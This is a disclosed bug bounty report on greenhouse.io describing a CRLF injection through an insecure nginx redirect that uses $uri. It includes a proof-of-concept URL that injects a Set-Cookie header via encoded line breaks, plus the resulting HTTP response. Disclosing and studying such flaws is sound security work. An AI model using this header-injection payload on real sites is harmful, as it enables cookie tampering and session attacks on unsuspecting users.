# [greenhouse.io] CRLF Injection / Insecure nginx configuration

## Report Details
- **Report ID**: 25275
- **URL**: https://hackerone.com/reports/25275
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2014-08-19T17:45:21.490Z
- **Disclosed**: 2016-11-02T13:27:21.114Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: greenhouse

## Vulnerability Information
PoC
http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io

HTTP Response:
Location: http://www.greenhouse.io/
Set-Cookie:test=test;domain=.greenhouse.io

Result: 
Creating cookie test=test on .greenhouse.io

$uri or $document_uri is used  in the redirection-URL.

## Attachments
No attachments
